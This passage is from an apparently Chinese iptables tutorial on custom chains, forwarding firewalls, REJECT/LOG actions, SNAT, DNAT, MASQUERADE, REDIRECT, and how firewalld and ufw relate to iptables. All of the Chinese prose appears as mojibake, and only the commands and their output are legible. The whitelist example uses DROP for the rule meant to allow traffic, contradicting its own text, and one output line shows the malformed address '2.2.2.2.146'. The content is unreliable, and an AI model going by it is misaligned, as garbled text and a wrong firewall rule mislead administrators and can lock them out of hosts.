-F\"æ¸…ç©ºè§„åˆ™æ—¶ï¼Œæ”¾è¡Œè§„åˆ™è¢«åˆ é™¤ï¼Œåˆ™æ‰€æœ‰æ•°æ®åŒ…éƒ½æ— æ³•è¿›å…¥ï¼Œè¿™ä¸ªæ—¶å€™å°±ç›¸å½“äºç»™ç®¡ç†å‘˜æŒ–äº†ä¸ªå‘ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å¦‚æœæƒ³è¦ä½¿ç”¨\"ç™½åå•\"çš„æœºåˆ¶ï¼Œæœ€å¥½å°†é“¾çš„é»˜è®¤ç­–ç•¥ä¿æŒä¸º\"ACCEPT\"ï¼Œç„¶åå°†\"æ‹’ç»æ‰€æœ‰è¯·æ±‚\"è¿™æ¡è§„åˆ™æ”¾åœ¨é“¾çš„å°¾éƒ¨ï¼Œå°†\"æ”¾è¡Œè§„åˆ™\"æ”¾åœ¨å‰é¢ï¼Œè¿™æ ·åšï¼Œæ—¢èƒ½å®ç°\"ç™½åå•\"æœºåˆ¶ï¼Œåˆèƒ½ä¿è¯åœ¨è§„åˆ™è¢«æ¸…ç©ºæ—¶ï¼Œç®¡ç†å‘˜è¿˜æœ‰æœºä¼šè¿æ¥åˆ°ä¸»æœºï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚\n\n```bash\niptables -I INPUT -s 192.168.1.111,192.168.1.118 -j DROP\niptables -A INPUT -j DROP\n```\n\n\n\n# 7. è‡ªå®šä¹‰é“¾\n\nå½“é»˜è®¤é“¾ä¸­çš„è§„åˆ™éå¸¸å¤šæ—¶ï¼Œä¸æ–¹ä¾¿æˆ‘ä»¬ç®¡ç†ã€‚\n\n### 7.1 æ–°å»º\n\n```bash\niptables -N IN_WEB\n\niptables -nvL\nChain IN_WEB (0 references)\n pkts bytes target     prot opt in     out     source               destination\n```\n\n\n\n### 7.2 æ·»åŠ è§„åˆ™\n\n```bash\niptables -I IN_WEB -s 1.1.1.2 -j REJECT\n\n\niptables -nvL IN_WEB\nChain IN_WEB (0 references)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 REJECT     all  --  *      *       1.1.1.2              0.0.0.0/0            reject-with icmp-port-unreachable\n```\n\n\n\n### 7.3 å¢åŠ å¼•ç”¨\n\nç°åœ¨ï¼Œè‡ªå®šä¹‰é“¾ä¸­å·²ç»æœ‰äº†ä¸€äº›è§„åˆ™ï¼Œä½†æ˜¯ç›®å‰ï¼Œè¿™äº›è§„åˆ™æ— æ³•åŒ¹é…åˆ°ä»»ä½•æŠ¥æ–‡ï¼Œå› ä¸ºæˆ‘ä»¬å¹¶æ²¡æœ‰åœ¨ä»»ä½•é»˜è®¤é“¾ä¸­å¼•ç”¨å®ƒã€‚\n\n\n```bash\niptables -I INPUT -p tcp -j IN_WEB\n\n\niptables -nvL INPUT\nChain INPUT (policy ACCEPT 7813 packets, 5921K bytes)\n pkts bytes target     prot opt in     out     source               destination\n 7614 5907K IN_WEB     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0\n```\n\nä¹‹å‰çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨\"-j\"é€‰é¡¹æŒ‡å®šåŠ¨ä½œï¼Œè€Œæ­¤å¤„ï¼Œæˆ‘ä»¬å°†\"åŠ¨ä½œ\"æ›¿æ¢ä¸ºäº†\"è‡ªå®šä¹‰é“¾\"\n\n\n\n### 7.4 ä¿®æ”¹\n\n```bash\niptables -E IN_WEB WEB\n```\n\n\n\n### 7.5 åˆ é™¤\n\n```bash\niptables -X WEB\n#iptables: Too many links.\n```\n\nå› ä¸ºæœ‰å¼•ç”¨, æ— æ³•åˆ é™¤\n\n```bash\niptables -D  INPUT 1\niptables -X WEB\n# iptables: Directory not empty.\n```\n\nå› ä¸ºæœ‰è§„åˆ™, æ— æ³•åˆ é™¤\n\n```bash\niptables -F WEB\niptables -X WEB\n\n# åˆ é™¤æˆåŠŸ\n```\n\n\n\n# 8. ç½‘ç»œé˜²ç«å¢™(filterè¡¨forwardé“¾)\n\nç½‘ç»œé˜²ç«å¢™çš„èŒè´£å°±æ˜¯\"è¿‡æ»¤å¹¶è½¬å‘\"ï¼Œè¦æƒ³\"è¿‡æ»¤\"ï¼Œåªèƒ½åœ¨INPUTã€OUTPUTã€FORWARDä¸‰æ¡é“¾ä¸­å®ç°ï¼Œè¦æƒ³\"è½¬å‘\"ï¼ŒæŠ¥æ–‡åˆ™åªä¼šç»è¿‡FORWARDé“¾ï¼ˆå‘å¾€æœ¬æœºçš„æŠ¥æ–‡æ‰ä¼šç»è¿‡INPUTé“¾ï¼‰\n\n![1](iptablesä½¿ç”¨æ•™ç¨‹/2.png)\n\niptablesçš„è§’è‰²å˜ä¸º\"ç½‘ç»œé˜²ç«å¢™\"æ—¶ï¼Œè§„åˆ™åªèƒ½å®šä¹‰åœ¨FORWARDé“¾ä¸­ã€‚\n\n\n\n### 8.1 ç”¨ä¾‹\n\n![1](iptablesä½¿ç”¨æ•™ç¨‹/3.png)\n\nä¸Šå›¾ä¸­çš„ä¸»æœºAå……å½“äº†\"å¤–éƒ¨ç½‘ç»œä¸»æœº\"çš„è§’è‰²ï¼ŒAä¸»æœºçš„IPåœ°å€ä¸º192.168.1.147ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸»æœºAè®¿é—®å†…éƒ¨ç½‘ç»œä¸­çš„ä¸»æœºCï¼Œä½†æ˜¯éœ€è¦ä¸»æœºBè¿›è¡Œè½¬å‘ï¼Œä¸»æœºBåœ¨è½¬å‘æŠ¥æ–‡æ—¶ä¼šè¿›è¡Œè¿‡æ»¤ï¼Œä»¥å®ç°ç½‘ç»œé˜²ç«å¢™çš„åŠŸèƒ½ã€‚\n\n\n\n### 8.2 é…ç½®\n\nè¦é…ç½®è½¬å‘ï¼Œåˆ™éœ€åœ¨FORWAEDé“¾ä¸­å®šä¹‰è§„åˆ™ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åº”è¯¥åœ¨filterè¡¨ä¸­çš„FORWARDé“¾ä¸­é…ç½®è§„åˆ™ã€‚\n\n```bash\niptables -nvL FORWARD\nChain FORWARD (policy ACCEPT 0 packets, 0 bytes)\n pkts bytes target     prot opt in     out     source               destination\n \n \n# æ·»åŠ é»˜è®¤æ‹’ç» \niptables -A FORWARD -j REJECT\n\n\n# æ·»åŠ è½¬å‘è§„åˆ™\niptables -I FORWARD -s 1.1.0.0/16 -p tcp -m tcp --dport 80 -j ACCEPT\niptables -I FORWARD -d 1.1.0.0/16 -p tcp -m tcp --sport 80 -j ACCEPT\n\n\niptables -nvL FORWARD\nChain FORWARD (policy ACCEPT 0 packets, 0 bytes)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 ACCEPT     tcp  --  *      *       0.0.0.0/0            1.1.0.0/16           tcp spt:80\n    0     0 ACCEPT     tcp  --  *      *       1.1.0.0/16           0.0.0.0/0            tcp dpt:80\n    0     0 REJECT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            reject-with icmp-port-unreachable\n```\n\n\n\nå½“iptablesä½œä¸º\"ç½‘ç»œé˜²ç«å¢™\"æ—¶ï¼Œåœ¨é…ç½®è§„åˆ™æ—¶ï¼Œå¾€å¾€éœ€è¦è€ƒè™‘\"åŒå‘æ€§\"ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¸ºäº†è¾¾æˆä¸€ä¸ªç›®çš„ï¼Œå¾€å¾€éœ€è¦ä¸¤æ¡è§„åˆ™æ‰èƒ½å®Œæˆã€‚æ¯æ¬¡é…ç½®è§„åˆ™æ—¶éƒ½è¦è€ƒè™‘\"åŒå‘\"çš„é—®é¢˜, å¯ä»¥è€ƒè™‘åŠ ä¸‹é¢çš„è§„åˆ™, ä»¥ååªåŠ å•å‘å°±å¯ä»¥äº†ã€‚\n\n```bash\niptablesÂ -IÂ FORWARDÂ -mÂ stateÂ --stateÂ ESTABLISHED,RELATEDÂ -jÂ ACCEPT\n```\n\n\n\n# 9. åŠ¨ä½œ\n\nä¹‹å‰ç”¨åˆ°çš„ACCEPTä¸DROPéƒ½å±äºåŸºç¡€åŠ¨ä½œã€‚ä½¿ç”¨-jå¯ä»¥æŒ‡å®šåŠ¨ä½œï¼Œæ¯”å¦‚-j ACCEPT, -j DROP, -j REJECT\n\n### 9.1 REJECT\n\nREJECTåŠ¨ä½œçš„å¸¸ç”¨é€‰é¡¹ä¸º--reject-with\n\nä½¿ç”¨--reject-withé€‰é¡¹ï¼Œå¯ä»¥è®¾ç½®æç¤ºä¿¡æ¯ï¼Œå½“å¯¹æ–¹è¢«æ‹’ç»æ—¶ï¼Œä¼šæç¤ºå¯¹æ–¹ä¸ºä»€ä¹ˆè¢«æ‹’ç»ã€‚\n\nå¯ç”¨å€¼å¦‚ä¸‹\n\nicmp-net-unreachable\n\nicmp-host-unreachable\n\nicmp-port-unreachable,\n\nicmp-proto-unreachable\n\nicmp-net-prohibited\n\nicmp-host-pro-hibited\n\nicmp-admin-prohibited\n\nå½“ä¸è®¾ç½®ä»»ä½•å€¼æ—¶ï¼Œé»˜è®¤å€¼ä¸ºicmp-port-unreachableã€‚\n\n### 9.2 LOG\n\nä½¿ç”¨LOGåŠ¨ä½œï¼Œå¯ä»¥å°†ç¬¦åˆæ¡ä»¶çš„æŠ¥æ–‡çš„ç›¸å…³ä¿¡æ¯è®°å½•åˆ°æ—¥å¿—ä¸­ï¼Œä½†å½“å‰æŠ¥æ–‡å…·ä½“æ˜¯è¢«\"æ¥å—\"ï¼Œè¿˜æ˜¯è¢«\"æ‹’ç»\"ï¼Œéƒ½ç”±åé¢çš„è§„åˆ™æ§åˆ¶ï¼Œæ¢å¥è¯è¯´ï¼ŒLOGåŠ¨ä½œåªè´Ÿè´£è®°å½•åŒ¹é…åˆ°çš„æŠ¥æ–‡çš„ç›¸å…³ä¿¡æ¯ï¼Œä¸è´Ÿè´£å¯¹æŠ¥æ–‡çš„å…¶ä»–å¤„ç†ï¼Œå¦‚æœæƒ³è¦å¯¹æŠ¥æ–‡è¿›è¡Œè¿›ä¸€æ­¥çš„å¤„ç†ï¼Œå¯ä»¥åœ¨ä¹‹åè®¾ç½®å…·ä½“è§„åˆ™ï¼Œè¿›è¡Œè¿›ä¸€æ­¥çš„å¤„ç†ã€‚\n\n\n\n### 9.3 SNAT(NATè¡¨)\n\n##### 9.3.1 NATä»‹ç»\n\nå†…éƒ¨ç½‘ç»œçš„æŠ¥æ–‡å‘é€å‡ºå»æ—¶ï¼ŒæŠ¥æ–‡çš„æºIPä¼šè¢«ä¿®æ”¹ï¼Œä¹Ÿå°±æ˜¯æºåœ°å€è½¬æ¢ï¼šSource Network Address Translationï¼Œç¼©å†™ä¸ºSNATã€‚\n\nå¤–éƒ¨ç½‘ç»œçš„æŠ¥æ–‡å“åº”æ—¶ï¼Œå“åº”æŠ¥æ–‡çš„ç›®æ ‡IPä¼šå†æ¬¡è¢«ä¿®æ”¹ï¼Œä¹Ÿå°±æ˜¯ç›®æ ‡åœ°å€è½¬æ¢ï¼šDestinationnetwork address translationï¼Œç¼©å†™ä¸ºDNATã€‚\n\næ•´ä¸ªè¿‡ç¨‹è¢«ç§°ä¸ºSNATè¿˜æ˜¯DNATï¼Œå–å†³äºæ•´ä¸ªè¿‡ç¨‹çš„å‰åŠæ®µä½¿ç”¨äº†SNATè¿˜æ˜¯DNATã€‚\n\n\n\n##### 9.3.2 æ“ä½œ\n\n```bash\niptables -t nat -A POSTROUTING -s 10.1.0.0/16 -j SNAT --to-source 2.2.2.2\n\niptables -t nat -nvL POSTROUTING\nChain POSTROUTING (policy ACCEPT 357 packets, 21639 bytes)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 SNAT       all  --  *      *       10.1.0.0/16          0.0.0.0/0            to:2.2.2.2\n```\n\nå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä¸Šå›¾ä¸­çš„è§„åˆ™è¡¨ç¤ºå°†æ¥è‡ªäº10.1.0.0/16ç½‘æ®µçš„æŠ¥æ–‡çš„æºåœ°å€æ”¹ä¸ºå…¬ç½‘IPåœ°å€(2.2.2.2)ã€‚\n\n\n\n1. \"-t nat\"è¡¨ç¤ºæ“ä½œnatè¡¨ï¼Œæˆ‘ä»¬ä¹‹å‰ä¸€ç›´åœ¨çŒè¾“ä¸€ä¸ªæ¦‚å¿µï¼Œå°±æ˜¯ä¸åŒçš„è¡¨æœ‰ä¸åŒçš„åŠŸèƒ½ï¼Œfilterè¡¨çš„åŠŸèƒ½æ˜¯è¿‡æ»¤ï¼Œnatè¡¨çš„åŠŸèƒ½å°±æ˜¯åœ°å€è½¬æ¢ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨natè¡¨ä¸­å®šä¹‰natè§„åˆ™ã€‚\n\n2. \"-A POSTROUTING\"è¡¨ç¤ºå°†SNATè§„åˆ™æ·»åŠ åˆ°POSTROUTINGé“¾çš„æœ«å°¾ï¼Œåœ¨centos7ä¸­ï¼ŒSNATè§„åˆ™åªèƒ½å­˜åœ¨äºPOSTROUTINGé“¾ä¸INPUTé“¾ä¸­ï¼Œåœ¨centos6ä¸­ï¼ŒSNATè§„åˆ™åªèƒ½å­˜åœ¨äºPOSTROUTINGé“¾ä¸­ã€‚\n\n3. ä¸ºä»€ä¹ˆSNATè§„åˆ™å¿…é¡»å®šä¹‰åœ¨POSTROUTINGé“¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·è®¤ä¸ºï¼ŒPOSTROUTINGé“¾æ˜¯iptablesä¸­æŠ¥æ–‡å‘å‡ºçš„æœ€åä¸€ä¸ª\"å…³å¡\"ï¼Œæˆ‘ä»¬åº”è¯¥åœ¨æŠ¥æ–‡é©¬ä¸Šå‘å‡ºä¹‹å‰ï¼Œä¿®æ”¹æŠ¥æ–‡çš„æºåœ°å€ï¼Œå¦åˆ™å°±å†ä¹Ÿæ²¡æœ‰æœºä¼šä¿®æ”¹æŠ¥æ–‡çš„æºåœ°å€äº†ã€‚\n\n4. å¦‚æœåªæ˜¯ç”¨äºé…ç½®SNATçš„è¯ï¼Œæˆ‘ä»¬å¹¶ä¸ç”¨æ‰‹åŠ¨çš„è¿›è¡ŒDNATè®¾ç½®ï¼Œiptablesä¼šè‡ªåŠ¨ç»´æŠ¤NATè¡¨ï¼Œå¹¶å°†å“åº”æŠ¥æ–‡çš„ç›®æ ‡åœ°å€è½¬æ¢å›æ¥ã€‚\n\n\n\n### 9.4  DNAT(NATè¡¨)\n\nå…¬å¸åªæœ‰ä¸€ä¸ªå…¬ç½‘IPï¼Œä½†æ˜¯å…¬å¸çš„å†…ç½‘ä¸­å´æœ‰å¾ˆå¤šæœåŠ¡å™¨æä¾›å„ç§æœåŠ¡ï¼Œæˆ‘ä»¬å¯¹å¤–å®£ç§°ï¼Œå…¬å¸çš„å…¬ç½‘IPä¸Šæ—¢æä¾›äº†webæœåŠ¡ï¼Œä¹Ÿæä¾›äº†windowsè¿œç¨‹æ¡Œé¢ï¼Œä¸ç®¡æ˜¯è®¿é—®webæœåŠ¡è¿˜æ˜¯è¿œç¨‹æ¡Œé¢ï¼Œåªè¦è®¿é—®è¿™ä¸ªå…¬ç½‘IPå°±è¡Œäº†ï¼Œæˆ‘ä»¬åˆ©ç”¨DNATï¼Œå°†å…¬ç½‘å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„æŠ¥æ–‡çš„ç›®æ ‡åœ°å€ä¸ç«¯å£å·åšäº†æ˜ å°„ï¼Œå°†è®¿é—®webæœåŠ¡çš„æŠ¥æ–‡è½¬å‘åˆ°äº†å†…ç½‘ä¸­çš„Cä¸»æœºä¸­ï¼Œå°†è®¿é—®è¿œç¨‹æ¡Œé¢çš„æŠ¥æ–‡è½¬å‘åˆ°äº†å†…ç½‘ä¸­çš„Dä¸»æœºä¸­ã€‚\n\n```bash\niptables -t nat -I PREROUTING -d 2.2.2.2 -p tcp --dport 3389 -j DNAT --to-destination 10.1.0.6:3389\n\n\niptables -t nat -vnL PREROUTING\nChain PREROUTING (policy ACCEPT 2 packets, 68 bytes)\n pkts bytes target     prot opt in     out     source               destination\n    0     0 DNAT       tcp  --  *      *       0.0.0.0/0            2.2.2.2.146        tcp dpt:3389 to:10.1.0.6:3389\n```\n\n\n\n1. \"-t nat -I PREROUTING\"è¡¨ç¤ºåœ¨natè¡¨ä¸­çš„PREROUTINGé“¾ä¸­é…ç½®DNATè§„åˆ™ï¼ŒDNATè§„åˆ™åªé…ç½®åœ¨PREROUTINGé“¾ä¸OUTPUTé“¾ä¸­ã€‚\n\n2. \"-d 2.2.2.2 -p tcp --dport 3389\"è¡¨ç¤ºæŠ¥æ–‡çš„ç›®æ ‡åœ°å€ä¸ºå…¬å¸çš„å…¬ç½‘IPåœ°å€ï¼Œç›®æ ‡ç«¯å£ä¸ºtcpçš„3389å·ç«¯å£ï¼Œè€Œæˆ‘ä»¬çŸ¥é“ï¼Œwindowsè¿œç¨‹æ¡Œé¢ä½¿ç”¨çš„é»˜è®¤ç«¯å£å·å°±æ˜¯3389ï¼Œå½“å¤–éƒ¨ä¸»æœºè®¿é—®å…¬å¸å…¬ç½‘IPçš„3389å·ç«¯å£æ—¶ï¼ŒæŠ¥æ–‡åˆ™ç¬¦åˆåŒ¹é…æ¡ä»¶ã€‚\n\n3. \"-j DNAT --to-destination 10.1.0.6:3389\"è¡¨ç¤ºå°†ç¬¦åˆæ¡ä»¶çš„æŠ¥æ–‡è¿›è¡ŒDNATï¼Œä¹Ÿå°±æ˜¯ç›®æ ‡åœ°å€è½¬æ¢ï¼Œå°†ç¬¦åˆæ¡ä»¶çš„æŠ¥æ–‡çš„ç›®æ ‡åœ°å€ä¸ç›®æ ‡ç«¯å£ä¿®æ”¹ä¸º10.1.0.6:3389ï¼Œ\"--to-destination\"å°±æ˜¯åŠ¨ä½œDNATçš„å¸¸ç”¨é€‰é¡¹ã€‚\n\n   é‚£ä¹ˆç»¼ä¸Šæ‰€è¿°ï¼Œå½“å¤–ç½‘ä¸»æœºè®¿é—®å…¬å¸å…¬ç½‘IP(2.2.2.2)çš„3389æ—¶ï¼Œå…¶æŠ¥æ–‡çš„ç›®æ ‡åœ°å€ä¸ç«¯å£å°†ä¼šè¢«æ˜ å°„åˆ°10.1.0.6:3389ä¸Šã€‚\n\n4. ç†è®ºä¸Šåªè¦å®Œæˆä¸Šè¿°DNATé…ç½®è§„åˆ™å³å¯ï¼Œä½†æ˜¯åœ¨æµ‹è¯•æ—¶ï¼Œåªé…ç½®DNATè§„åˆ™åï¼Œå¹¶ä¸èƒ½æ­£å¸¸DNATï¼Œç»è¿‡æµ‹è¯•å‘ç°ï¼Œå°†ç›¸åº”çš„SNATè§„åˆ™åŒæ—¶é…ç½®åï¼Œå³å¯æ­£å¸¸DNATï¼Œäºæ˜¯æˆ‘ä»¬åˆé…ç½®äº†SNATã€‚\n\n  ```bash\n  iptables -t nat -A POSTROUTING -s 10.1.0.0/16 -j SNAT --to-source 2.2.2.2\n  ```\n\n\n\n### 9.5 MASQUERADE\n\nå½“æˆ‘ä»¬æ‹¨å·ç½‘ä¸Šæ—¶ï¼Œæ¯æ¬¡åˆ†é…çš„IPåœ°å€å¾€å¾€ä¸åŒï¼Œä¸ä¼šé•¿æœŸåˆ†ç»™æˆ‘ä»¬ä¸€ä¸ªå›ºå®šçš„IPåœ°å€ï¼Œå¦‚æœè¿™æ—¶ï¼Œæˆ‘ä»¬æƒ³è¦è®©å†…ç½‘ä¸»æœºå…±äº«å…¬ç½‘IPä¸Šç½‘ï¼Œå°±ä¼šå¾ˆéº»çƒ¦ï¼Œå› ä¸ºæ¯æ¬¡IPåœ°å€å‘ç”Ÿå˜åŒ–ä»¥åï¼Œæˆ‘ä»¬éƒ½è¦é‡æ–°é…ç½®SNATè§„åˆ™ï¼Œè¿™æ ·æ˜¾ç¤ºä¸æ˜¯å¾ˆäººæ€§åŒ–ï¼Œæˆ‘ä»¬é€šè¿‡MASQUERADEå³å¯è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒMASQUERADEä¼šåŠ¨æ€çš„å°†æºåœ°å€è½¬æ¢ä¸ºå¯ç”¨çš„IPåœ°å€ï¼Œå…¶å®ä¸SNATå®ç°çš„åŠŸèƒ½å®Œå…¨ä¸€è‡´ï¼Œéƒ½æ˜¯ä¿®æ”¹æºåœ°å€ã€‚\n\nåªä¸è¿‡SNATéœ€è¦æŒ‡æ˜å°†æŠ¥æ–‡çš„æºåœ°å€æ”¹ä¸ºå“ªä¸ªIPï¼Œè€ŒMASQUERADEåˆ™ä¸ç”¨æŒ‡å®šæ˜ç¡®çš„IPï¼Œä¼šåŠ¨æ€çš„å°†æŠ¥æ–‡çš„æºåœ°å€ä¿®æ”¹ä¸ºæŒ‡å®šç½‘å¡ä¸Šå¯ç”¨çš„IPåœ°å€ã€‚\n\n```bash\niptables -t nat -I POSTROUTING -s 10.1.0.0/16 -j SNAT --to-source 2.2.2.2\n\n# MASQUERADEçš„å¯¹æ¯”\niptables -t nat -I POSTROUTING -s 10.1.0.0/16 -o ç½‘å¡åå­— -j MASQUERADE\n```\n\nå¯ä»¥æŠŠMASQUERADEç†è§£ä¸ºåŠ¨æ€çš„ã€è‡ªåŠ¨åŒ–çš„SNATï¼Œå¦‚æœæ²¡æœ‰åŠ¨æ€SNATçš„éœ€æ±‚ï¼Œæ²¡æœ‰å¿…è¦ä½¿ç”¨MASQUERADEï¼Œå› ä¸ºSNATæ›´åŠ é«˜æ•ˆã€‚\n\n\n\n### 9.6 REDIRECT\n\nä½¿ç”¨REDIRECTåŠ¨ä½œå¯ä»¥åœ¨æœ¬æœºä¸Šè¿›è¡Œç«¯å£æ˜ å°„\n\næ¯”å¦‚ï¼Œå°†æœ¬æœºçš„80ç«¯å£æ˜ å°„åˆ°æœ¬æœºçš„8080ç«¯å£ä¸Š\n\n```bash\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080\n```\n\nç»è¿‡ä¸Šè¿°è§„åˆ™æ˜ å°„åï¼Œå½“åˆ«çš„æœºå™¨è®¿é—®æœ¬æœºçš„80ç«¯å£æ—¶ï¼ŒæŠ¥æ–‡ä¼šè¢«é‡å®šå‘åˆ°æœ¬æœºçš„8080ç«¯å£ä¸Šã€‚\n\nREDIRECTè§„åˆ™åªèƒ½å®šä¹‰åœ¨PREROUTINGé“¾æˆ–è€…OUTPUTé“¾ä¸­ã€‚\n\n\n\n# 10. é˜²ç«å¢™å…³ç³»\n\n### 10.1 firewalld å’Œ iptables å…³ç³»(Centos)\n\nConterOS7.0ä»¥ä¸Šä½¿ç”¨çš„æ˜¯firewallï¼ŒConterOS7.0ä»¥ä¸‹ä½¿ç”¨çš„æ˜¯iptables\n\nåœ¨RHEL7é‡Œæœ‰å‡ ç§é˜²ç«å¢™å…±å­˜ï¼šfirewalldã€iptablesã€ebtablesï¼Œé»˜è®¤æ˜¯ä½¿ç”¨firewalldæ¥ç®¡ç†netfilterå­ç³»ç»Ÿï¼Œä¸è¿‡åº•å±‚è°ƒç”¨çš„å‘½ä»¤ä»ç„¶æ˜¯iptablesç­‰ã€‚\n\nfirewalldè·Ÿiptablesæ¯”èµ·æ¥è‡³å°‘æœ‰ä¸¤å¤§å¥½å¤„ï¼š\n\n1ã€firewalldå¯ä»¥åŠ¨æ€ä¿®æ”¹å•æ¡è§„åˆ™ï¼Œè€Œä¸éœ€è¦åƒiptablesé‚£æ ·ï¼Œåœ¨ä¿®æ”¹äº†è§„åˆ™åå¿…é¡»å¾—å…¨éƒ¨åˆ·æ–°æ‰å¯ä»¥ç”Ÿæ•ˆï¼›\n\n2ã€firewalldåœ¨ä½¿ç”¨ä¸Šè¦æ¯”iptablesäººæ€§åŒ–å¾ˆå¤šï¼Œå³ä½¿ä¸æ˜ç™½â€œäº”å¼ è¡¨äº”æ¡é“¾â€è€Œä¸”å¯¹TCP/IPåè®®ä¹Ÿä¸ç†è§£ä¹Ÿå¯ä»¥å®ç°å¤§éƒ¨åˆ†åŠŸèƒ½ã€‚\n\nfirewalldè·Ÿiptablesæ¯”èµ·æ¥ï¼Œä¸å¥½çš„åœ°æ–¹æ˜¯æ¯ä¸ªæœåŠ¡éƒ½éœ€è¦å»è®¾ç½®æ‰èƒ½æ”¾è¡Œï¼Œå› ä¸ºé»˜è®¤æ˜¯æ‹’ç»ã€‚è€Œiptablesé‡Œé»˜è®¤æ˜¯æ¯ä¸ªæœåŠ¡æ˜¯å…è®¸ï¼Œéœ€è¦æ‹’ç»çš„æ‰å»é™åˆ¶ã€‚\n\n\n\n### 10.2 ufw å’Œ iptables å…³ç³»(Ubuntu)\n\nUncomplicated Firewallï¼Œç®€ç§° UFWï¼Œæ˜¯Ubuntuç³»ç»Ÿä¸Šé»˜è®¤çš„é˜²ç«å¢™ç»„ä»¶ã€‚UFWæ˜¯ä¸ºè½»é‡åŒ–é…ç½®iptablesè€Œå¼€å‘çš„ä¸€æ¬¾å·¥å…·ã€‚UFW æä¾›ä¸€ä¸ªéå¸¸å‹å¥½çš„ç•Œé¢ç”¨äºåˆ›å»ºåŸºäºIPV4ï¼ŒIPV6çš„é˜²ç«å¢™è§„åˆ™ã€‚UFW åœ¨ Ubuntu 8.04 LTS åçš„æ‰€æœ‰å‘è¡Œç‰ˆä¸­é»˜è®¤å¯ç”¨ã€‚\n\nå½“ä½¿ç”¨äº† ufw è¿™ç±»å‰ç«¯æ—¶ï¼Œå°±æœ€å¥½ä¸è¦å†ç¢° iptables äº†ï¼Œå°¤å…¶è¦æ…é‡ä½¿ç”¨ iptables â€“ æ¥æ¸…ç©ºæ‰€æœ‰é“¾çš„è§„åˆ™ã€‚åœ¨ä¸äº†è§£ iptables çš„è¡¨ã€é“¾ã€è§„åˆ™ä¹‹å‰ï¼Œç›²ç›®çš„æ¸…ç©º iptablesâ€è§„åˆ™â€ å°±æ˜¯è€æµæ°“ï¼\n\nè¯•æƒ³ï¼Œå‡å¦‚ä½ åœ¨æœåŠ¡å™¨ä¸Šufw enableï¼Œé‚£ä¹ˆ INPUT å’Œ FORWARD å°±æ˜¯ DROPï¼Œé‚£ä¹ˆå½“ä½ iptables -Fæ—¶ï¼Œä¸ä»…ä»…æ˜¯ SSH çš„ä¾‹å¤–è§„åˆ™æ²¡äº†ï¼Œæ‰€æœ‰å‡ºç½‘çš„åŒ…ä¹Ÿéƒ½å‡ºä¸å»äº†ï¼æ­¤æ—¶å”¯ä¸€èƒ½åšçš„äº‹æƒ…å°±æ˜¯å» VNCã€æˆ–è€…å»æœºæˆ¿æ’é¼ æ ‡é”®ç›˜æ˜¾ç¤ºå™¨ã€‚\n\n\n\n### 10.3 è™šæ‹Ÿé˜²ç«å¢™å’Œå®‰å…¨ç»„æœ‰ä»€ä¹ˆå·®å¼‚\n\n+ äº‘è™šæ‹Ÿé˜²ç«å¢™æ˜¯äº’è”ç½‘è¾¹ç•Œé˜²ç«å¢™ã€VPCè¾¹ç•Œé˜²ç«å¢™ã€ä¸»æœºè¾¹ç•Œé˜²ç«å¢™çš„ç»Ÿç§°ï¼Œä¸ºæ‚¨æä¾›äº’è”ç½‘è¾¹ç•Œã€VPCç½‘ç»œè¾¹ç•Œã€ECSå®ä¾‹é—´çš„ä¸‰é‡é˜²æŠ¤ã€‚\n\n+ å®‰å…¨ç»„æ˜¯ECSæä¾›çš„è™šæ‹Ÿä¸»æœºé˜²ç«å¢™ï¼Œå¯¹ECSå®ä¾‹é—´çš„æµé‡è¿›è¡Œè®¿é—®æ§åˆ¶ã€‚\n\nç»“è®º: \n\n1. é˜²ç«å¢™æ˜¯åœ¨å®‰å…¨ç»„ä¹‹å‰ç”Ÿæ•ˆçš„ã€‚\n\n2. é˜²ç«å¢™ä¸»è¦æ˜¯åšå—åŒ—å‘çš„è®¿é—®æ§åˆ¶ï¼Œä½œç”¨èŒƒå›´æ˜¯æ•´ä¸ªVPCï¼Œå®‰å…¨ç»„ä¸»è¦æ˜¯åšä¸œè¥¿å‘çš„è®¿é—®æ§åˆ¶ï¼Œä½œç”¨èŒƒå›´æ˜¯è™šæ‹Ÿæœºç½‘å¡ï¼Œå’Œé˜²ç«å¢™å½¢æˆäº’è¡¥çš„å…³ç³»ã€‚\n\n![1](iptablesä½¿ç”¨æ•™ç¨‹/99.png)\n\n\n\n\n\n# 11. å‘½ä»¤æ€»ç»“\n\n### 11.1 è¿‡æ»¤æŸ¥çœ‹\n\n```bash\n#æŸ¥çœ‹å¯¹åº”è¡¨çš„æ‰€æœ‰è§„åˆ™ï¼Œ-té€‰é¡¹æŒ‡å®šè¦æ“ä½œçš„è¡¨ï¼Œçœç•¥\"-t è¡¨å\"æ—¶ï¼Œé»˜è®¤è¡¨ç¤ºæ“ä½œfilterè¡¨ï¼Œ-Lè¡¨ç¤ºåˆ—å‡ºè§„åˆ™ï¼Œå³æŸ¥çœ‹è§„åˆ™\niptablesÂ -tÂ è¡¨åÂ -L\n\n\n#æŸ¥çœ‹æŒ‡å®šè¡¨çš„æŒ‡å®šé“¾ä¸­çš„è§„åˆ™\niptables -t è¡¨å -L é“¾å\n\n\n\n# 